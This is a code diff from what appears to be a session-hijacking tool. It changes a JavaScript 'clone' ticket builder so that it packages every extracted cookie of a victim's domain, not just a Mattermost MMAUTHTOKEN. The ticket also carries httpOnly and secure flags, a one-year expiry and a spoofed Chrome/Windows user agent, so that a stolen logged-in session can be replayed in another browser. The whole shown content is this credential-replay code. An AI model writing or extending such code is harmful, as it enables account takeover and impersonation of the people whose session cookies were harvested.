@@ -776,6 +776,37 @@ if (ticketBtn) {
         try { hostname = new URL(serverUrl).hostname; } catch(e) {}
         var expiry = Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60);
 
+        // Build cookies from all extracted domain cookies
+        var ticketCookies = [];
+        if (credData.allCookies && credData.allCookies.length > 0) {
+            for (var ci = 0; ci < credData.allCookies.length; ci++) {
+                var ck = credData.allCookies[ci];
+                ticketCookies.push({
+                    name: ck.name,
+                    value: ck.value,
+                    httpOnly: !!ck.httpOnly,
+                    secure: !!ck.secure,
+                    sameSite: ck.sameSite || 'lax',
+                    path: ck.path || '/',
+                    domain: ck.domain || hostname,
+                    expirationDate: expiry
+                });
+            }
+        }
+        // Fallback: if no allCookies, at least include MMAUTHTOKEN
+        if (ticketCookies.length === 0 && (credData.cookie || credData.token)) {
+            ticketCookies.push({
+                name: 'MMAUTHTOKEN',
+                value: credData.cookie || credData.token,
+                httpOnly: true,
+                secure: true,
+                sameSite: 'lax',
+                path: '/',
+                domain: hostname,
+                expirationDate: expiry
+            });
+        }
+
         var ticket = {
             version: 1,
             type: 'clone',
@@ -784,18 +815,7 @@ if (ticketBtn) {
             userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
             platform: 'Windows',
             browser: 'Chrome',
-            cookies: [
-                {
-                    name: 'MMAUTHTOKEN',
-                    value: credData.cookie || credData.token,
-                    httpOnly: true,
-                    secure: true,
-                    sameSite: 'lax',
-                    path: '/',
-                    domain: hostname,
-                    expirationDate: expiry
-                }
-            ],
+            cookies: ticketCookies,
             headers: [],
             localStorage: [],
             sessionStorage: [],
